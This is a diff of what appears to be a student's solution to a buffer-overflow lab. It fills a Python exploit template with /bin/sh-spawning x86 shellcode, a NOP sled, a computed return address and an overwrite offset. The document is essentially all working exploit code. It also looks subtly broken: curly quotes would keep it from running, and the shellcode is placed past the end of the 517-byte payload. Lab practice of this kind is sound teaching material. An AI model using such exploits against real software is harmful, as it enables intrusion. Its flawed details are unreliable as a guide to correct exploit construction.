@@ -22,18 +22,21 @@ $2 = (char (*)[100]) 0xffffca9c
 #!/usr/bin/python3
 import sys
 shellcode= (
-"" # ✩ Need to change ✩
+                   "\x31\xc0\x50\x68\x2f\x2f\x73"
+                   "\x68\x68\x2f\x62\x69\x6e\x89"
+                   "\xe3\x89\xc1\x89\xc2\xb0\x0b"
+                   "\xcd\x80\x31\xc0\x40\xcd\x80"
 ).encode(’latin-1’)
 # Fill the content with NOP’s
 content = bytearray(0x90 for i in range(517))
 ##################################################################
 # Put the shellcode somewhere in the payload
-start = 0 # ✩ Need to change ✩
+start = 517 
 content[start:start + len(shellcode)] = shellcode
 # Decide the return address value
 # and put it somewhere in the payload
-ret = 0x00 # ✩ Need to change ✩
-offset = 0 # ✩ Need to change ✩
+ret = 0xffffca9c+start # ✩ Need to change ✩
+offset = 0xffffcb08-0xffffca9c+4 # ✩ Need to change ✩
 L = 4 # Use 4 for 32-bit address and 8 for 64-bit address
 content[offset:offset + L] = (ret).to_bytes(L,byteorder=’little’)
 ##################################################################
